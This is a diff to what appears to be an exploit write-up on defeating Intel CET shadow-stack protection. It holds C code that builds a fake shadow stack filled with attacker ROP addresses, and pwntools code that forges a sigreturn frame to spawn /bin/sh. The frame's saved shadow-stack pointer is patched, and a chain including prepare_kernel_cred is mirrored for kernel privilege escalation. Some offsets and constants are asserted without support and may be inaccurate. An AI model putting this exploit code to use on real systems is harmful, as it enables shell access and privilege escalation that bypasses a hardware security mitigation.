@@ -176,7 +176,7 @@ void *shstk_mem = mmap(NULL, 0x2000, PROT_READ|PROT_WRITE,
 unsigned long ssp = (unsigned long)shstk_mem + 0x2000 - 8;
 
  // 2. Mark it as shadow stack (requires CET arch_prctl)
-arch_prctl(ARCH_SHSTK_SHSTK, ...); // or kernel auto-marks sigaltstack
+arch_prctl(ARCH_SHSTK_ENABLE, ...); // ARCH_SHSTK_ENABLE = 0x5001; or kernel auto-marks sigaltstack
 arch_prctl(ARCH_CET_ALLOC_SHSTK, &ssp);
 
 // 3. Push attacker ROP addresses onto shadow stack (must mirror normal stack)
@@ -217,10 +217,18 @@ frame.rdi = binsh_addr
 frame.rsi = 0
 frame.rdx = 0
 frame.rip = syscall_ret
-# CET-aware kernels: signal frame's shadow stack area (bytes 0x1e8-0x200) holds SSP
-# Overwrite it so kernel's WRUSSQ restores a valid SSP before RET
-frame.__ssp = fake_shstk_addr  # pwntools SigreturnFrame exposes ssp field on CET builds
 frame.rsp = normal_rop_addr
+# NOTE: pwntools SigreturnFrame has no ssp field. For CET shadow-stack control,
+# build the raw frame then patch the SSP slot in the xsave area manually, and
+# push a matching shadow-stack ROP pivot so RET pairs with the restored SSP:
+raw = bytearray(bytes(frame))
+# SSP lives in the signal frame's shadow-stack area (bytes 0x1e8-0x200 on
+# CET-aware kernels); overwrite it so the kernel restores a valid SSP on sigreturn
+ssp_offset = 0x1e8
+raw[ssp_offset:ssp_offset + 8] = p64(fake_shstk_addr)
+# Mirror the normal-stack ROP chain onto the fake shadow stack so each RET
+# finds the same return address on both stacks
+fake_shstk = flat([pop_rdi_ret, 0, prepare_kernel_cred])
 ```
 
 **Key insights:**
